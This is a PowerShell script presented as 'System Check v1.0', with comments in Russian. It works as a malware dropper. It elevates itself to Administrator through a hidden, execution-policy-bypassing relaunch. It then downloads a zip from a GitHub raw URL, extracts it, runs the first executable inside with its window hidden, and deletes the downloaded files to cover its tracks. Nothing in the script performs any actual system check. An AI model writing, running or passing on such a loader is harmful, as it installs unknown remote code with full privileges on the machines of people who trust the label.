# =============================================
# System Check v1.0
# =============================================

# Часть 1: Базовые переменные
$p1 = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$p2 = "$env:TEMP\check_install.zip"
$p3 = "$env:TEMP\checkextracted"

# Часть 2: Функция скачивания (скрыта)
function Get-File {
    param($u, $d)
    try {
        (New-Object System.Net.WebClient).DownloadFile($u, $d)
    } catch {
        try {
            Start-BitsTransfer -Source $u -Destination $d -Priority Low -Asynchronous
            Start-Sleep -Seconds 2
            Get-BitsTransfer | Complete-BitsTransfer
        } catch {}
    }
}

# Часть 3: Функция распаковки
function Expand-File {
    param($s, $d)
    try {
        Expand-Archive -Path $s -DestinationPath $d -Force
    } catch {}
}

# Часть 4: Функция запуска
function Start-File {
    param($p)
    $exe = Get-ChildItem -Path $p -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($exe) {
        Start-Process -FilePath $exe.FullName -WindowStyle Hidden
    }
}

# Часть 5: Очистка
function Clean-Up {
    param($f1, $f2)
    try { Remove-Item $f1 -Force } catch {}
    try { Remove-Item $f2 -Recurse -Force } catch {}
}

# Часть 6: Главное выполнение
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $args = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $args -WindowStyle Hidden
    exit
}

Get-File $p1 $p2
Expand-File $p2 $p3
Start-File $p3
Clean-Up $p2 $p3
